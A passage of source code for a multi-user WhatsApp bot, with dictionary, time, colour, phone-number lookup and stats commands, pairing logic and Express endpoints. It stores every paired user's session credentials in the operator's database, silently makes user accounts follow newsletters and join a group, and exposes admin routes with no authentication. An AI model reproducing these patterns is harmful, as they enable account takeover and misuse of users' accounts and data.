    react("✅");
  } catch (e) {
    react("❌");
    await socket.sendMessage(from, { text: `❌ FLIP ERROR: ${e.message}` }, { quoted: msg });
  }
  break;
}

// ============================================================
// 📖 DEFINE — Définition d'un mot (dictionnaire)
// ============================================================
case 'define':
case 'dict':
case 'definition': {
  try {
    const word = args.join(' ').trim().toLowerCase();

    if (!word) {
      return await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📖 *𝐃𝐈𝐂𝐓𝐈𝐎𝐍𝐍𝐀𝐈𝐑𝐄*
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋📌 ᴜsᴀɢᴇ :
│. ˚˖𓍢ִ໋• .define love
│. ˚˖𓍢ִ໋• .dict serendipity
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    }

    react("📖");

    const dictRes = await axios.get(
      `https://api.dictionaryapi.dev/api/v2/entries/en/${encodeURIComponent(word)}`,
      { timeout: 10000 }
    );

    const entry = dictRes.data?.[0];
    if (!entry) throw new Error('Mot introuvable');

    const phonetic = entry.phonetic || entry.phonetics?.[0]?.text || '';
    const meanings = entry.meanings?.slice(0, 2) || [];

    let txt =
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📖 *𝐃𝐈𝐂𝐓𝐈𝐎𝐍𝐍𝐀𝐈𝐑𝐄*
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋📝 ᴍᴏᴛ : *${entry.word}*
│. ˚˖𓍢ִ໋🔊 ᴘʜᴏɴᴇ́ᴛɪǫᴜᴇ : ${phonetic}
│. ˚˖𓍢ִ໋\n`;

    for (const m of meanings) {
      txt += `│. ˚˖𓍢ִ໋🏷️ *${m.partOfSpeech?.toUpperCase()}*\n`;
      const defs = m.definitions?.slice(0, 2) || [];
      for (const d of defs) {
        txt += `│. ˚˖𓍢ִ໋• ${d.definition?.slice(0, 100)}\n`;
        if (d.example) txt += `│. ˚˖𓍢ִ໋  ex: _${d.example?.slice(0, 80)}_\n`;
      }
      txt += `│. ˚˖𓍢ִ໋\n`;
    }

    const synonyms = meanings[0]?.synonyms?.slice(0, 4) || [];
    if (synonyms.length) txt += `│. ˚˖𓍢ִ໋🔗 sʏɴᴏɴʏᴍᴇs : ${synonyms.join(', ')}\n│. ˚˖𓍢ִ໋\n`;

    txt += `│. ˚˖𓍢ִ໋𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 🎠\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`;

    await socket.sendMessage(from, { text: txt }, { quoted: msg });
    react("✅");
  } catch (e) {
    react("❌");
    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐌𝐎𝐓 𝐈𝐍𝐓𝐑𝐎𝐔𝐕𝐀𝐁𝐋𝐄*
│. ˚˖𓍢ִ໋• Dictionnaire EN seulement
│. ˚˖𓍢ִ໋• Ex: .define love
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }
  break;
}

// ============================================================
// ⏱️ COUNTDOWN — Compte à rebours / Timestamp
// ============================================================
case 'time':
case 'heure':
case 'datetime': {
  try {
    react("⏰");

    const tz = args.join(' ').trim() || 'America/Port-au-Prince';

    let timeStr, dateStr, dayStr;
    try {
      const now = moment().tz(tz);
      timeStr = now.format('HH:mm:ss');
      dateStr = now.format('DD/MM/YYYY');
      dayStr  = now.format('dddd');
    } catch {
      const now = moment().tz('America/Port-au-Prince');
      timeStr = now.format('HH:mm:ss');
      dateStr = now.format('DD/MM/YYYY');
      dayStr  = now.format('dddd');
    }

    // Fuseaux communs
    const zones = [
      { label: '🇭🇹 Port-au-Prince', tz: 'America/Port-au-Prince' },
      { label: '🇫🇷 Paris',          tz: 'Europe/Paris' },
      { label: '🇺🇸 New York',        tz: 'America/New_York' },
      { label: '🇧🇷 São Paulo',       tz: 'America/Sao_Paulo' },
      { label: '🇬🇧 Londres',         tz: 'Europe/London' },
    ];

    let worldTimes = '';
    for (const z of zones) {
      try {
        const t = moment().tz(z.tz).format('HH:mm');
        worldTimes += `│. ˚˖𓍢ִ໋${z.label} : *${t}*\n`;
      } catch {}
    }

    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋⏰ *𝐇𝐄𝐔𝐑𝐄 𝐌𝐎𝐍𝐃𝐈𝐀𝐋𝐄*
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋📅 ᴅᴀᴛᴇ  : *${dateStr}*
│. ˚˖𓍢ִ໋📆 ᴊᴏᴜʀ  : ${dayStr}
│. ˚˖𓍢ִ໋⏱️  ʜᴇᴜʀᴇ : *${timeStr}*
│. ˚˖𓍢ִ໋🌍 ᴢᴏɴᴇ  : ${tz}
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋🗺️ ʜᴇᴜʀᴇs ᴍᴏɴᴅᴇ :
${worldTimes}│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 🎠
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

    react("✅");
  } catch (e) {
    react("❌");
    await socket.sendMessage(from, { text: `❌ TIME ERROR: ${e.message}` }, { quoted: msg });
  }
  break;
}

// ============================================================
// 🎨 COLORHEX — Info couleur depuis un code HEX
// ============================================================
case 'color':
case 'hex':
case 'couleur': {
  try {
    let hex = args[0]?.replace('#', '').trim().toUpperCase();

    if (!hex || !/^[0-9A-F]{6}$/i.test(hex)) {
      // Génère une couleur aléatoire si pas d'argument
      hex = Math.floor(Math.random() * 0xFFFFFF).toString(16).padStart(6, '0').toUpperCase();
    }

    react("🎨");

    const r = parseInt(hex.slice(0, 2), 16);
    const g = parseInt(hex.slice(2, 4), 16);
    const b = parseInt(hex.slice(4, 6), 16);

    // Convertir en HSL
    const rn = r / 255, gn = g / 255, bn = b / 255;
    const max = Math.max(rn, gn, bn), min = Math.min(rn, gn, bn);
    const l = (max + min) / 2;
    const d = max - min;
    const s = d === 0 ? 0 : d / (1 - Math.abs(2 * l - 1));
    let h = 0;
    if (d !== 0) {
      if (max === rn) h = ((gn - bn) / d + (gn < bn ? 6 : 0)) / 6;
      else if (max === gn) h = ((bn - rn) / d + 2) / 6;
      else h = ((rn - gn) / d + 4) / 6;
    }

    const hsl = `hsl(${Math.round(h * 360)}, ${Math.round(s * 100)}%, ${Math.round(l * 100)}%)`;
    const brightness = Math.round((r * 299 + g * 587 + b * 114) / 1000);
    const isDark = brightness < 128;

    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🎨 *𝐈𝐍𝐅𝐎 𝐂𝐎𝐔𝐋𝐄𝐔𝐑*
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋🖌️ ʜᴇx  : *#${hex}*
│. ˚˖𓍢ִ໋🟥 ʀᴇᴅ  : ${r} (${Math.round(r / 255 * 100)}%)
│. ˚˖𓍢ִ໋🟩 ɢʀᴇᴇɴ: ${g} (${Math.round(g / 255 * 100)}%)
│. ˚˖𓍢ִ໋🟦 ʙʟᴜᴇ : ${b} (${Math.round(b / 255 * 100)}%)
│. ˚˖𓍢ִ໋🌈 ʜsʟ  : ${hsl}
│. ˚˖𓍢ִ໋☀️ ʟᴜᴍɪɴ: ${brightness}/255
│. ˚˖𓍢ִ໋🌑 ᴛʏᴘᴇ : ${isDark ? 'Couleur sombre 🌑' : 'Couleur claire ☀️'}
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋💡 .hex FF5500 — infos couleur
│. ˚˖𓍢ִ໋   .hex — couleur aléatoire
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 🎠
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

    react("✅");
  } catch (e) {
    react("❌");
    await socket.sendMessage(from, { text: `❌ HEX ERROR: ${e.message}` }, { quoted: msg });
  }
  break;
}

// ============================================================
// 🔎 WHOIS — Infos sur un numéro WhatsApp
// ============================================================
case 'whois':
case 'checknum':
case 'numinfo': {
  try {
    if (!isOwner && !isAdmin) {
      react("❌");
      return await socket.sendMessage(from, {
        text: `╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n│. ˚˖𓍢ִ໋❌ *𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃*\n│. ˚˖𓍢ִ໋• Admin/Owner seulement\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    }

    const targetRaw = args[0]?.replace(/[^0-9]/g, '') || senderNumber;
    const targetJid = `${targetRaw}@s.whatsapp.net`;

    react("🔎");

    // Vérifie si le numéro est sur WhatsApp
    const [result] = await socket.onWhatsApp(targetJid);
    const exists = !!result?.exists;

    // Récupère photo de profil
    let ppUrl = config.IMAGE_PATH;
    try { ppUrl = await socket.profilePictureUrl(targetJid, 'image'); } catch {}

    // Status about
    let about = 'Non disponible';
    try { const s = await socket.fetchStatus(targetJid); about = s?.status || 'Non défini'; } catch {}

    // Vérifie si session active
    const isActive = activeSockets.has(targetRaw);

    await socket.sendMessage(from, {
      image: { url: ppUrl },
      caption:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🔎 *𝐖𝐇𝐎𝐈𝐒 — +${targetRaw}*
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋📱 ɴᴜᴍᴇ́ʀᴏ  : +${targetRaw}
│. ˚˖𓍢ִ໋📲 ᴡʜᴀᴛsᴀᴘᴘ : ${exists ? '✅ Actif' : '❌ Inactif'}
│. ˚˖𓍢ִ໋🤖 sᴇssɪᴏɴ  : ${isActive ? '🟢 Connecté' : '⚫ Non connecté'}
│. ˚˖𓍢ִ໋💬 sᴛᴀᴛᴜs   : ${about.slice(0, 80)}
│. ˚˖𓍢ִ໋🆔 ᴊɪᴅ      : ${targetJid}
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 🎠
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

    react("✅");
  } catch (e) {
    react("❌");
    await socket.sendMessage(from, { text: `❌ WHOIS ERROR: ${e.message}` }, { quoted: msg });
  }
  break;
}

// ============================================================
// 📊 STATS — Statistiques du bot
// ============================================================
case 'stats':
case 'botinfo':
case 'botstat': {
  try {
    react("📊");

    const uptime   = process.uptime();
    const h = Math.floor(uptime / 3600);
    const m = Math.floor((uptime % 3600) / 60);
    const s = Math.floor(uptime % 60);
    const uptimeStr = `${h}h ${m}m ${s}s`;

    const mem     = process.memoryUsage();
    const memMB   = Math.round(mem.heapUsed / 1024 / 1024);
    const memTot  = Math.round(mem.heapTotal / 1024 / 1024);

    const sessions = activeSockets.size;
    const logCount = global.botLogs?.length || 0;

    // OS info
    const platform = require('os').platform();
    const cpus     = require('os').cpus().length;
    const freeMem  = Math.round(require('os').freemem() / 1024 / 1024);
    const totMem   = Math.round(require('os').totalmem() / 1024 / 1024);

    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📊 *𝐒𝐓𝐀𝐓𝐈𝐒𝐓𝐈𝐐𝐔𝐄𝐒 𝐁𝐎𝐓*
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋🤖 ʙᴏᴛ         : ${config.BOT_NAME}
│. ˚˖𓍢ִ໋👑 ᴘʀᴏᴘ        : ${config.OWNER_NAME}
│. ˚˖𓍢ִ໋📦 ᴠᴇʀsɪᴏɴ     : ${config.BOT_VERSION}
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋⏱️  ᴜᴘᴛɪᴍᴇ      : ${uptimeStr}
│. ˚˖𓍢ִ໋👥 sᴇssɪᴏɴs    : ${sessions}
│. ˚˖𓍢ִ໋📋 ʟᴏɢs         : ${logCount}
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋🖥️  ᴏs           : ${platform}
│. ˚˖𓍢ִ໋💻 ᴄᴘᴜ          : ${cpus} cœurs
│. ˚˖𓍢ִ໋💾 ʀᴀᴍ ᴜsᴇᴅ     : ${memMB}/${memTot} MB
│. ˚˖𓍢ִ໋💿 ʀᴀᴍ ʟɪʙʀᴇ    : ${freeMem}/${totMem} MB
│. ˚˖𓍢ִ໋🟢 sᴛᴀᴛᴜs       : ONLINE ✅
│. ˚˖𓍢ִ໋
│. ˚˖ִִ໋໋𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 🎠
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

    react("✅");
  } catch (e) {
    react("❌");
    await socket.sendMessage(from, { text: `❌ STATS ERROR: ${e.message}` }, { quoted: msg });
  }
  break;
}

        // default
        default:
          break;
      }
    } catch (err) {
      console.error('Command handler error:', err);
      try { await socket.sendMessage(sender, { image: { url: config.RCD_IMAGE_PATH }, caption: formatMessage('❌ ERROR', 'An error occurred while processing your command. Please try again.', BOT_NAME_FANCY) }); } catch(e){}
    }

  });
}

// ---------------- message handlers ----------------

function setupMessageHandlers(socket) {
  socket.ev.on('messages.upsert', async ({ messages }) => {
    const msg = messages[0];
    if (!msg.message || msg.key.remoteJid === 'status@broadcast' || msg.key.remoteJid === config.NEWSLETTER_JID) return;
    if (config.AUTO_RECORDING === 'true') {
      try { await socket.sendPresenceUpdate('recording', msg.key.remoteJid); } catch (e) {}
    }
  });
}

// ---------------- cleanup helper ----------------

async function deleteSessionAndCleanup(number, socketInstance) {
  const sanitized = number.replace(/[^0-9]/g, '');
  try {
    const sessionPath = path.join(os.tmpdir(), `session_${sanitized}`);
    try { if (fs.existsSync(sessionPath)) fs.removeSync(sessionPath); } catch(e){}
    activeSockets.delete(sanitized); socketCreationTime.delete(sanitized);
    try { await removeSessionFromMongo(sanitized); } catch(e){}
    try { await removeNumberFromMongo(sanitized); } catch(e){}
    try {
      const ownerJid = `${config.OWNER_NUMBER.replace(/[^0-9]/g,'')}@s.whatsapp.net`;
      const caption = formatMessage('👑 OWNER NOTICE — SESSION REMOVED', `Number: ${sanitized}\nSession removed due to logout.\n\nActive sessions now: ${activeSockets.size}`, BOT_NAME_FANCY);
      if (socketInstance && socketInstance.sendMessage) await socketInstance.sendMessage(ownerJid, { image: { url: config.RCD_IMAGE_PATH }, caption });
    } catch(e){}
    console.log(`Cleanup completed for ${sanitized}`);
  } catch (err) { console.error('deleteSessionAndCleanup error:', err); }
}

// ---------------- auto-restart ----------------

function setupAutoRestart(socket, number) {

  socket.ev.on('connection.update', async (update) => {

    const { connection, lastDisconnect } = update;

    if (connection === 'close') {

      const statusCode =
        lastDisconnect?.error?.output?.statusCode
        || lastDisconnect?.error?.statusCode
        || (
          lastDisconnect?.error &&
          lastDisconnect.error.toString().includes('401')
            ? 401
            : undefined
        );

      const isLoggedOut =
        statusCode === 401
        || (
          lastDisconnect?.error &&
          lastDisconnect.error.code === 'AUTHENTICATION'
        )
        || (
          lastDisconnect?.error &&
          String(lastDisconnect.error)
          .toLowerCase()
          .includes('logged out')
        )
        || (
          lastDisconnect?.reason ===
          DisconnectReason?.loggedOut
        );

      // ================= DISCONNECT NOTIFICATION =================

      await sendOwnerDisconnectNotification(
        socket,
        number,
        statusCode || "Unknown"
      );

      if (isLoggedOut) {

        console.log(
          `User ${number} logged out. Cleaning up...`
        );

        try {

          await deleteSessionAndCleanup(
            number,
            socket
          );

        } catch(e) {

          console.error(e);

        }

      } else {

        console.log(
          `Connection closed for ${number}. Reconnecting...`
        );

        try {

          await delay(10000);

          activeSockets.delete(
            number.replace(/[^0-9]/g,'')
          );

          socketCreationTime.delete(
            number.replace(/[^0-9]/g,'')
          );

          const mockRes = {
            headersSent:false,
            send:() => {},
            status: () => mockRes
          };

          await EmpirePair(
            number,
            mockRes
          );

        } catch(e){

          console.error(
            'Reconnect attempt failed',
            e
          );

        }
      }
    }
  });
}

// ---------------- EmpirePair (pairing, temp dir, persist to Mongo) ----------------

async function EmpirePair(number, res) {

  const sanitizedNumber = number.replace(/[^0-9]/g, '');
  const sessionPath = path.join(os.tmpdir(), `session_${sanitizedNumber}`);

  await initMongo().catch(() => {});

  // ================= LOAD USER COUNT =================

  async function getUserNumber() {

    try {

      const users = await getAllNumbersFromMongo();

      const index = users.findIndex(
        user => String(user.number || user) === sanitizedNumber
      );

      return index >= 0 ? `#${index + 1}` : '#1';

    } catch (e) {

      console.error('Failed to get user number:', e);

      return '#1';

    }

  }

  // ================= SEND OWNER NOTIFICATION =================

  async function sendOwnerBotConnected(socket, number, userTag) {

    try {

      const ownerNumber =
        process.env.OWNER_NUMBER || "56967395519";

      const ownerJid = `${ownerNumber}@s.whatsapp.net`;

      const userConfig =
        await loadUserConfigFromMongo(number) || {};

      const useBotName =
        userConfig.botName || BOT_NAME_FANCY;

      const useLogo =
        userConfig.logo || config.RCD_IMAGE_PATH;

      const connectMessage = formatMessage(
        useBotName,

`╭┈┈『 🌐 𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 』
│
│ ✅ ʙᴏᴛ ᴄᴏɴɴᴇᴄᴛᴇᴅ
│ 👤 ɴᴇᴡ ᴜsᴇʀ : ${userTag}
│ 🔢 ɴᴜᴍʙᴇʀ : ${number}
│ 🕒 ${getBrazilTimestamp()}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`

      );

      try {

        if (String(useLogo).startsWith('http')) {

          await socket.sendMessage(ownerJid, {
            image: { url: useLogo },
            caption: connectMessage
          });

        } else {

          try {

            const buffer = fs.readFileSync(useLogo);

            await socket.sendMessage(ownerJid, {
              image: buffer,
              caption: connectMessage
            });

          } catch {

            await socket.sendMessage(ownerJid, {
              text: connectMessage
            });

          }

        }

      } catch (err) {

        console.error(
          'Failed to send owner connect notification:',
          err
        );

      }

    } catch (e) {

      console.error(
        'Owner notification function failed:',
        e
      );

    }

  }

  // ================= PREFILL CREDS =================

  try {

    const mongoDoc =
      await loadCredsFromMongo(sanitizedNumber);

    if (mongoDoc && mongoDoc.creds) {

      fs.ensureDirSync(sessionPath);

      fs.writeFileSync(
        path.join(sessionPath, 'creds.json'),
        JSON.stringify(mongoDoc.creds, null, 2)
      );

      if (mongoDoc.keys) {

        fs.writeFileSync(
          path.join(sessionPath, 'keys.json'),
          JSON.stringify(mongoDoc.keys, null, 2)
        );

      }

      console.log('Prefilled creds from Mongo');

    }

  } catch (e) {

    console.warn('Prefill from Mongo failed', e);

  }

  const { state, saveCreds } =
    await useMultiFileAuthState(sessionPath);

  const logger = pino({
    level:
      process.env.NODE_ENV === 'production'
        ? 'fatal'
        : 'debug'
  });

  try {

    const socket = makeWASocket({

      auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(
          state.keys,
          logger
        )
      },

      printQRInTerminal: false,
      logger,

      browser: [
        "Ubuntu",
        "Chrome",
        "20.0.04"
      ]

    });

    // ================= SOCKET CREATION =================

    socketCreationTime.set(
      sanitizedNumber,
      Date.now()
    );

    socket.downloadMediaMessage = (m, filename) =>
      downloadMediaMessage(m, filename);

    setupStatusHandlers(socket, sanitizedNumber);
    setupCommandHandlers(socket, sanitizedNumber);
    setupMessageHandlers(socket);
    setupAutoRestart(socket, sanitizedNumber);
    setupNewsletterHandlers(socket, sanitizedNumber);

    registerGroupParticipantListener(socket)
      .catch(err =>
        console.error(
          'Listener init failed',
          err
        )
      );

    handleMessageRevocation(
      socket,
      sanitizedNumber
    );

    // ================= PAIRING CODE =================

    if (!socket.authState.creds.registered) {

      let retries = config.MAX_RETRIES;
      let code;

      while (retries > 0) {

        try {

          await delay(1500);

          code =
            await socket.requestPairingCode(
              sanitizedNumber
            );

          break;

        } catch (error) {

          retries--;

          await delay(
            2000 *
            (config.MAX_RETRIES - retries)
          );

        }

      }

      if (!res.headersSent) {

        res.send({ code });

      }

    }

    // ================= SAVE CREDS =================

    socket.ev.on(
      'creds.update',
      async () => {

        try {

          await saveCreds();

          const fileContent =
            await fs.readFile(
              path.join(
                sessionPath,
                'creds.json'
              ),
              'utf8'
            );

          const credsObj =
            JSON.parse(fileContent);

          const keysObj =
            state.keys || null;

          await saveCredsToMongo(
            sanitizedNumber,
            credsObj,
            keysObj
          );

        } catch (err) {

          console.error(
            'Failed saving creds:',
            err
          );

        }

      }
    );

    // ================= CONNECTION UPDATE =================

    socket.ev.on(
      'connection.update',
      async (update) => {

        const { connection } = update;

        // ================= OPEN =================

        if (connection === 'open') {

          try {

            await delay(3000);

            const userJid =
              jidNormalizedUser(
                socket.user.id
              );

            const groupResult =
              await joinGroup(socket)
                .catch(() => ({
                  status: 'failed',
                  error:
                    'joinGroup not configured'
                }));

            // ================= FOLLOW NEWSLETTERS =================

            try {

              const newsletterListDocs =
                await listNewslettersFromMongo();

              for (const doc of newsletterListDocs) {

                const jid = doc.jid;

                try {

                  if (
                    typeof socket.newsletterFollow ===
                    'function'
                  ) {

                    await socket.newsletterFollow(jid);

                  }

                } catch (e) {}

              }

            } catch (e) {}

            activeSockets.set(
              sanitizedNumber,
              socket
            );

            // ================= USER CONFIG =================

            const userConfig =
              await loadUserConfigFromMongo(
                sanitizedNumber
              ) || {};

            const useBotName =
              userConfig.botName ||
              BOT_NAME_FANCY;

            const useLogo =
              userConfig.logo ||
              config.RCD_IMAGE_PATH;

            // ================= USER NUMBER =================

            const userTag =
              await getUserNumber();

            // ================= INITIAL MESSAGE =================

            const initialCaption =
              formatMessage(
                useBotName,

`╭┈┈『 🌐 𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 』
│
│ ✅ ᴄᴏɴɴᴇxɪᴏɴ ᴇ́ᴛᴀʙʟɪᴇ
│ 👤 ᴜsᴇʀ : ${userTag}
│ 🔢 ${sanitizedNumber}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`

              );

            let sentMsg = null;

            try {

              if (
                String(useLogo).startsWith(
                  'http'
                )
              ) {

                sentMsg =
                  await socket.sendMessage(
                    userJid,
                    {
                      image: {
                        url: useLogo
                      },
                      caption:
                        initialCaption
                    }
                  );

              } else {

                try {

                  const buf =
                    fs.readFileSync(
                      useLogo
                    );

                  sentMsg =
                    await socket.sendMessage(
                      userJid,
                      {
                        image: buf,
                        caption:
                          initialCaption
                      }
                    );

                } catch {

                  sentMsg =
                    await socket.sendMessage(
                      userJid,
                      {
                        text:
                          initialCaption
                      }
                    );

                }

              }

            } catch (e) {

              console.warn(
                'Failed to send connect message:',
                e?.message || e
              );

            }

            await delay(4000);

            // ================= UPDATED MESSAGE =================

            const updatedCaption =
              formatMessage(
                useBotName,

`╭┈┈『 🌐 𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 』
│ ✅ 𝐂𝐎𝐍𝐄𝐂𝐓𝐄𝐃
│ 🌟 уσυ м∂ ιѕ ʜєʀє
│ 👤 ᴜsᴇʀ : ${userTag}
│ 🔢 ${sanitizedNumber}
│ 🕒 ${getHaitiTimestamp()}
│ ᴛʏᴘᴇ .ᴍᴇɴᴜ
│ ᴛᴏ sᴇᴇ ᴀʟʟ ᴄᴍᴅs
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`

              );

            try {

              if (sentMsg?.key) {

                try {

                  await socket.sendMessage(
                    userJid,
                    {
                      delete:
                        sentMsg.key
                    }
                  );

                } catch (e) {}

              }

              if (
                String(useLogo).startsWith(
                  'http'
                )
              ) {

                await socket.sendMessage(
                  userJid,
                  {
                    image: {
                      url: useLogo
                    },
                    caption:
                      updatedCaption
                  }
                );

              } else {

                try {

                  const buf =
                    fs.readFileSync(
                      useLogo
                    );

                  await socket.sendMessage(
                    userJid,
                    {
                      image: buf,
                      caption:
                        updatedCaption
                    }
                  );

                } catch {

                  await socket.sendMessage(
                    userJid,
                    {
                      text:
                        updatedCaption
                    }
                  );

                }

              }

            } catch (e) {

              console.error(
                'Failed updated message:',
                e
              );

            }

            // ================= SEND OWNER MESSAGE =================

            await sendOwnerBotConnected(
              socket,
              sanitizedNumber,
              userTag
            );

            // ================= SAVE USER =================

            await addNumberToMongo(
              sanitizedNumber
            );

          } catch (e) {

            console.error(
              'Connection open error:',
              e
            );

            try {

              exec(
                `pm2.restart ${
                  process.env.PM2_NAME ||
                  'YOU WEB BOT'
                }`
              );

            } catch (e) {

              console.error(
                'pm2 restart failed',
                e
              );

            }

          }

        }

        // ================= CLOSE =================

        if (connection === 'close') {

          try {

            if (
              fs.existsSync(sessionPath)
            ) {

              fs.removeSync(sessionPath);

            }

          } catch (e) {}

        }

      }
    );

    activeSockets.set(
      sanitizedNumber,
      socket
    );

  } catch (error) {

    console.error(
      'Pairing error:',
      error
    );

    socketCreationTime.delete(
      sanitizedNumber
    );

    if (!res.headersSent) {

      res.status(503).send({
        error: 'Service Unavailable'
      });

    }

  }

}


// ---------------- endpoints (admin/newsletter management + others) ----------------

router.post('/newsletter/add', async (req, res) => {
  const { jid, emojis } = req.body;
  if (!jid) return res.status(400).send({ error: 'jid required' });
  if (!jid.endsWith('@newsletter')) return res.status(400).send({ error: 'Invalid newsletter jid' });
  try {
    await addNewsletterToMongo(jid, Array.isArray(emojis) ? emojis : []);
    res.status(200).send({ status: 'ok', jid });
  } catch (e) { res.status(500).send({ error: e.message || e }); }
});


router.post('/newsletter/remove', async (req, res) => {
  const { jid } = req.body;
  if (!jid) return res.status(400).send({ error: 'jid required' });
  try {
    await removeNewsletterFromMongo(jid);
    res.status(200).send({ status: 'ok', jid });
  } catch (e) { res.status(500).send({ error: e.message || e }); }
});


router.get('/newsletter/list', async (req, res) => {
  try {
    const list = await listNewslettersFromMongo();
    res.status(200).send({ status: 'ok', channels: list });
  } catch (e) { res.status(500).send({ error: e.message || e }); }
});


// admin endpoints

router.post('/admin/add', async (req, res) => {
  const { jid } = req.body;
  if (!jid) return res.status(400).send({ error: 'jid required' });
  try {
    await addAdminToMongo(jid);
    res.status(200).send({ status: 'ok', jid });
  } catch (e) { res.status(500).send({ error: e.message || e }); }
});


router.post('/admin/remove', async (req, res) => {
  const { jid } = req.body;
  if (!jid) return res.status(400).send({ error: 'jid required' });
  try {
    await removeAdminFromMongo(jid);
    res.status(200).send({ status: 'ok', jid });
  } catch (e) { res.status(500).send({ error: e.message || e }); }
});


router.get('/admin/list', async (req, res) => {
  try {
    const list = await loadAdminsFromMongo();
    res.status(200).send({ status: 'ok', admins: list });
  } catch (e) { res.status(500).send({ error: e.message || e }); }
});


// existing endpoints (connect, reconnect, active, etc.)

router.get('/', async (req, res) => {
  const { number } = req.query;
  if (!number) return res.status(400).send({ error: 'Number parameter is required' });
  if (activeSockets.has(number.replace(/[^0-9]/g, ''))) return res.status(200).send({ status: 'already_connected', message: 'This number is already connected' });
  await EmpirePair(number, res);
});


router.get('/active', (req, res) => {
  res.status(200).send({ botName: BOT_NAME_FANCY, count: activeSockets.size, numbers: Array.from(activeSockets.keys()), timestamp: getHaitiTimestamp() });
});


router.get('/ping', (req, res) => {
  res.status(200).send({ status: 'active', botName: BOT_NAME_FANCY, message: 'YOU-WEB-BOT', activesession: activeSockets.size });
});


router.get('/connect-all', async (req, res) => {
  try {
    const numbers = await getAllNumbersFromMongo();
    if (!numbers || numbers.length === 0) return res.status(404).send({ error: 'No numbers found to connect' });
    const results = [];
    for (const number of numbers) {
      if (activeSockets.has(number)) { results.push({ number, status: 'already_connected' }); continue; }
      const mockRes = { headersSent: false, send: () => {}, status: () => mockRes };
      await EmpirePair(number, mockRes);
      results.push({ number, status: 'connection_initiated' });
    }
    res.status(200).send({ status: 'success', connections: results });
  } catch (error) { console.error('Connect all error:', error); res.status(500).send({ error: 'Failed to connect all bots' }); }
});


router.get('/reconnect', async (req, res) => {
  try {
    const numbers = await getAllNumbersFromMongo();
    if (!numbers || numbers.length === 0) return res.status(404).send({ error: 'No session numbers found in MongoDB' });
    const results = [];
    for (const number of numbers) {
      if (activeSockets.has(number)) { results.push({ number, status: 'already_connected' }); continue; }
      const mockRes = { headersSent: false, send: () => {}, status: () => mockRes };
      try { await EmpirePair(number, mockRes); results.push({ number, status: 'connection_initiated' }); } catch (err) { results.push({ number, status: 'failed', error: err.message }); }
      await delay(1000);
    }
    res.status(200).send({ status: 'success', connections: results });
  } catch (error) { console.error('Reconnect error:', error); res.status(500).send({ error: 'Failed to reconnect bots' }); }
});


router.get('/update-config', async (req, res) => {
  const { number, config: configString } = req.query;
  if (!number || !configString) return res.status(400).send({ error: 'Number and config are required' });
  let newConfig;
  try { newConfig = JSON.parse(configString); } catch (error) { return res.status(400).send({ error: 'Invalid config format' }); }
  const sanitizedNumber = number.replace(/[^0-9]/g, '');
  const socket = activeSockets.get(sanitizedNumber);
  if (!socket) return res.status(404).send({ error: 'No active session found for this number' });
  const otp = generateOTP();
  otpStore.set(sanitizedNumber, { otp, expiry: Date.now() + config.OTP_EXPIRY, newConfig });
  try { await sendOTP(socket, sanitizedNumber, otp); res.status(200).send({ status: 'otp_sent', message: 'OTP sent to your number' }); }
